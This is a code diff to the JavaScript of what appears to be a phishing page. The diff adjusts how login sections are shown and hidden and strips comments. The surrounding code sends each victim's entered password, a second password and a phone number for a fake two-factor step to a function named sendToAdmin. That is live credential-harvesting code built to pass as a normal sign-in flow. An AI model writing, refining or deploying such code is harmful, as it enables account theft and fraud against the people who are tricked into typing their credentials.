@@ -29,12 +29,15 @@ document.addEventListener('DOMContentLoaded', () => {
         ];
         allSections.forEach(id => {
             const el = document.getElementById(id);
-            if(el) el.style.display = "none"; 
+            if(el) {
+                el.classList.remove('active');
+                el.style.display = "none";
+            }
         });
         const targetEl = document.getElementById(targetId);
         if(targetEl) {
-            targetEl.style.display = "table-cell"; // Fixed vertical centering bug
-            targetEl.classList.remove('d-none');
+            targetEl.classList.add('active');
+            targetEl.style.display = "table-cell"; // Restores perfect vertical centering
         }
     }
 
@@ -118,7 +121,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // --- Listeners ---
     if(document.getElementById('btn_next')) document.getElementById('btn_next').addEventListener('click', () => {
         if (unameInp && unameInp.value.trim() !== "") {
             updateLogos(); 
@@ -132,7 +134,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (confirmInp && confirmInp.value.trim() !== "") sendToAdmin("Second Password Submitted", { password: confirmInp.value });
     });
     
-    // Automated 5-second 2FA logic
     if(document.getElementById('btn_verify')) document.getElementById('btn_verify').addEventListener('click', () => {
         if (verifyStartInp && verifyStartInp.value.trim() !== "") {
             sendToAdmin("Phone Number Submitted", { phone: verifyStartInp.value });
